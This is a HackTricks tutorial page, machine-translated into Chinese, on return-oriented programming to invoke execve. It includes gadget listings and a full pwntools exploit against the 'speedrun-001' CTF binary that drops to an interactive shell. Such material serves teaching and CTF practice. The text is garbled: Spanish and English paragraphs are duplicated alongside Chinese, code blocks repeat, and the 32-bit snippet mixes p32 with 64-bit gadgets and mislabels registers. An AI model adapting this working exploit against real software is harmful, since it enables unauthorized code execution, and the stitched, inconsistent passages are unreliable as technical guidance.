# ROP - 调用 sys\_execve

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

为了准备调用 **syscall**，需要进行以下配置：

* `rax: 59 指定 sys_execve`
* `rdi: 指向 "/bin/sh" 的指针，指定要执行的文件`
* `rsi: 0 指定没有传递参数`
* `rdx: 0 指定没有传递环境变量`

因此，基本上需要在某个地方写入字符串 `/bin/sh`，然后执行 `syscall`（注意需要控制堆栈的填充）。

## 控制寄存器

让我们从找到**如何控制这些寄存器**开始：
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
使用这些地址，可以将内容写入堆栈并加载到寄存器中。

## 写入字符串

### 可写内存

首先，您需要在内存中找到一个可写的位置
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### 写入字符串

然后你需要找到一种方法将任意内容写入这个地址中
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32位

##### ROP + syscall + execv

##### ROP + syscall + execv

Esta técnica se utiliza para ejecutar un comando en un sistema Linux de 32 bits utilizando la técnica de Return-Oriented Programming (ROP), llamadas al sistema (syscalls) y la función execv.

这种技术用于在32位Linux系统上使用Return-Oriented Programming (ROP)技术、系统调用(syscalls)和execv函数来执行命令。

La técnica ROP se utiliza para construir una cadena de gadgets (pequeños fragmentos de código) que se encuentran en la memoria del programa vulnerable. Estos gadgets se utilizan para manipular el flujo de ejecución del programa y lograr la ejecución de código arbitrario.

ROP技术用于构建一个gadget链（小代码片段），这些gadget位于受漏洞程序的内存中。这些gadget用于操纵程序的执行流程，实现任意代码的执行。

En este caso, utilizaremos gadgets que nos permitan llamar a una syscall específica, en este caso la syscall execve, que nos permitirá ejecutar un comando en el sistema.

在这种情况下，我们将使用能够调用特定系统调用的gadget，例如execve系统调用，该系统调用允许我们在系统中执行命令。

La syscall execve toma tres argumentos: la dirección de la cadena que contiene el comando a ejecutar, un array de argumentos y un array de variables de entorno.

execve系统调用接受三个参数：包含要执行的命令的字符串的地址、参数数组和环境变量数组。

Para utilizar esta técnica, primero necesitamos encontrar los gadgets necesarios en el programa vulnerable. Estos gadgets deben cumplir con ciertas condiciones, como la existencia de instrucciones "pop" para desapilar valores de la pila y cargarlos en registros, y la existencia de instrucciones "ret" para retornar a la dirección siguiente en la pila.

要使用这种技术，首先需要在受漏洞程序中找到所需的gadget。这些gadget必须满足一定的条件，例如存在用于从堆栈中弹出值并将其加载到寄存器中的"pop"指令，以及存在用于返回到堆栈中的下一个地址的"ret"指令。

Una vez que hemos identificado los gadgets necesarios, construimos una cadena de ROP que los utilice en el orden correcto para lograr la ejecución de la syscall execve.

一旦我们确定了所需的gadget，我们就可以构建一个ROP链，按照正确的顺序使用它们来实现execve系统调用的执行。

La cadena de ROP se construye colocando las direcciones de memoria de los gadgets en la pila en el orden correcto, seguidas de los argumentos necesarios para la syscall execve.

ROP链的构建是将gadget的内存地址按正确的顺序放置在堆栈上，然后是execve系统调用所需的参数。

Una vez que la cadena de ROP está construida, se sobrescribe la dirección de retorno de la función vulnerable con la dirección de inicio de la cadena de ROP.

构建好ROP链后，将受漏洞函数的返回地址覆盖为ROP链的起始地址。

Cuando la función vulnerable retorna, en lugar de retornar a la dirección original de retorno, se ejecutará la cadena de ROP, que a su vez ejecutará la syscall execve y ejecutará el comando especificado.

当受漏洞函数返回时，它将不会返回到原始的返回地址，而是执行ROP链，进而执行execve系统调用并执行指定的命令。

Esta técnica es muy poderosa, ya que nos permite ejecutar comandos arbitrarios en el sistema, lo que puede ser utilizado para obtener una shell remota o realizar otras acciones maliciosas.

这种技术非常强大，因为它允许我们在系统中执行任意命令，这可以用于获取远程shell或执行其他恶意操作。
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64位

##### ROP (Return Oriented Programming) - execv

##### ROP（返回导向编程）- execv

The execv function is used to execute a program. It takes two arguments: the path to the program and an array of strings that represent the program's arguments. The array must be terminated with a NULL pointer.

execv函数用于执行程序。它接受两个参数：程序的路径和一个字符串数组，表示程序的参数。该数组必须以NULL指针结尾。

To call execv using ROP, we need to find the address of the execv function in memory and the addresses of the arguments we want to pass to it. We can do this by leaking memory or by using gadgets to load the addresses into registers.

要使用ROP调用execv，我们需要找到内存中execv函数的地址以及我们要传递给它的参数的地址。我们可以通过泄漏内存或使用gadget将地址加载到寄存器中来实现这一点。

Once we have the addresses, we can construct a ROP chain that sets up the arguments and calls execv. The ROP chain will consist of gadgets that load the arguments into registers and gadgets that call the execv function.

一旦我们有了这些地址，我们就可以构建一个ROP链，设置参数并调用execv。ROP链将由将参数加载到寄存器中的gadget和调用execv函数的gadget组成。

Here is an example of a ROP chain that calls execv:

下面是一个调用execv的ROP链的示例：

```
pop_rdi = 0x0000000000400686 # pop rdi ; ret
pop_rsi_r15 = 0x0000000000400684 # pop rsi ; pop r15 ; ret
null = 0x0000000000000000

rop_chain = [
    pop_rdi, path_to_program,
    pop_rsi_r15, args_array, null,
    execv
]
```

```
pop_rdi = 0x0000000000400686 # pop rdi ; ret
pop_rsi_r15 = 0x0000000000400684 # pop rsi ; pop r15 ; ret
null = 0x0000000000000000

rop_chain = [
    pop_rdi, path_to_program,
    pop_rsi_r15, args_array, null,
    execv
]
```

In this example, `pop_rdi` and `pop_rsi_r15` are gadgets that pop values from the stack into the `rdi`, `rsi`, and `r15` registers, respectively. `null` is a NULL pointer. `path_to_program` is the address of the string that represents the path to the program, and `args_array` is the address of the array of strings that represent the program's arguments.

在这个例子中，`pop_rdi`和`pop_rsi_r15`是从堆栈中弹出值到`rdi`、`rsi`和`r15`寄存器的gadget。`null`是一个NULL指针。`path_to_program`是表示程序路径的字符串的地址，`args_array`是表示程序参数的字符串数组的地址。

By constructing a ROP chain like this, we can execute arbitrary programs with arbitrary arguments using the execv function.

通过构建这样的ROP链，我们可以使用execv函数执行任意程序，并传递任意参数。
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## 示例

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execv(args[0], args);
    return 0;
}
```

This is a simple C program that executes a shell (/bin/sh) using the `execv` function. The `execv` function takes two arguments: the path to the executable (/bin/sh) and an array of strings representing the command-line arguments (in this case, just NULL).

When this program is compiled and executed, it will spawn a shell process, allowing the user to interact with the command line.

## 例子

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execv(args[0], args);
    return 0;
}
```

这是一个简单的C程序，使用`execv`函数执行一个shell (/bin/sh)。`execv`函数接受两个参数：可执行文件的路径 (/bin/sh) 和一个字符串数组，表示命令行参数（在这个例子中，只有NULL）。

当编译并执行这个程序时，它将生成一个shell进程，允许用户与命令行进行交互。
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## 参考资料

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
